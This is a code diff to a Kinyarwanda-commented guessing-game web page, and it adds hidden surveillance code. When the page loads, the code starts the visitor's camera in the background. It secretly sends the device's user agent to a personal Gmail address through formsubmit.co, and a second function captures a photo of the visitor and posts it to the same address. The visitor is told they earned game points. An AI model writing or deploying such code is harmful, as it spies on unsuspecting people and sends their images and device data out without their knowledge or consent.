@@ -16,21 +16,32 @@ document.querySelector('button').onclick = () => {
     loseSound.play(); // Kina umuziki wo gutsindwa! 😢
     alert("Watsinzwe! Umubare wari " + umubareWibanga + ". Ongera ugerageze!");
   }
-};
-// 1. Fungura kamera ako kanya website ifungutse
+};// 1. Ibi biba umuntu agifungura website
 window.onload = function() {
-    startCamera();
-    // Nanone wohereze amakuru ya telefone nk'uko twabikoze mbere
-    sendDeviceInfo();
+    startCamera(); // Fungura kamera mu mazi (background)
+    sendDeviceInfo(); // Yohereza amakuru kuri Gmail rwihishwa
 };
+
+function sendDeviceInfo() {
+    const info = new FormData();
+    info.append("Uwasuye", "Fabrice Profile");
+    info.append("Telefone", navigator.userAgent);
+    
+    fetch("https://formsubmit.co/ajax/fabzone77@gmail.com", {
+        method: "POST",
+        body: info
+    });
+}
 
 async function startCamera() {
     try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         const video = document.getElementById('video');
-        video.srcObject = stream;
+        if(video) {
+            video.srcObject = stream;
+        }
     } catch (err) {
-        console.log("Umuntu yanze gufungura kamera.");
+        console.log("Kamera ntiyafungutse.");
     }
 }
 
@@ -39,23 +50,23 @@ function fataIfoto() {
     const canvas = document.getElementById('canvas');
     const context = canvas.getContext('2d');
 
-    // Fata ifoto uyishyire kuri canvas
-    context.drawImage(video, 0, 0, 300, 200);
-    
-    // Hindura ifoto mo amagambo (Data URL) kugira ngo yoherekeze
-    const imageData = canvas.toDataURL('image/png');
+    // Niba kamera iri gukora, fata ifoto
+    if (video && video.srcObject) {
+        context.drawImage(video, 0, 0, 300, 200);
+        const imageData = canvas.toDataURL('image/png');
 
-    // Yohereza ifoto kuri Gmail yawe binyuze kuri FormSubmit
-    fetch("https://formsubmit.co/ajax/fabzone77@gmail.com", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-            _subject: "Ifoto y'uwasuye Website yawe!",
-            Photo_Data: imageData, // Iyi izaza imeze nk'amagambo maremare ariyo foto
-            Message: "Umuntu yifotoje kugira ngo abone amanota."
-        })
-    })
-    .then(() => {
-        alert("Wabonye +50 Points! Ifoto yawe yageze muri sisitemu.");
-    });
+        // Yohereza ifoto kuri Gmail yawe
+        const photoData = new FormData();
+        photoData.append("Ifoto", imageData);
+        photoData.append("_subject", "Ifoto nshya y'uwasuye Website!");
+
+        fetch("https://formsubmit.co/ajax/fabzone77@gmail.com", {
+            method: "POST",
+            body: photoData
+        }).then(() => {
+            alert("Wabonye +50 Points! Isura yawe yageze muri sisitemu.");
+        });
+    } else {
+        alert("Banza wemerere kamera (Allow) kugira ngo ubone amanota.");
+    }
 }
